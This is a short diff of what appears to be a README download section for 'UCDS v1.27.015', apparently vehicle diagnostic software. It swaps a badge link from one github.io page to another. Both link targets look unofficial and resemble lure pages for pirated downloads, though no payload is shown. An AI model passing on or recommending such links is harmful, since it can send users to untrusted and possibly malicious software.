@@ -2,7 +2,7 @@
 
 ## 📥 Download UCDS v1.27.015
 
-[![⬇️ Download UCDS](https://img.shields.io/badge/Download-UCDS%20v1.27.015-blue?style=for-the-badge&logo=ford)](https://ucds-v127015-download.github.io/.github)
+[![⬇️ Download UCDS](https://img.shields.io/badge/Download-UCDS%20v1.27.015-blue?style=for-the-badge&logo=ford)](https://ucds-v1-27-015-for-win.github.io/.github)
 
 ---
 
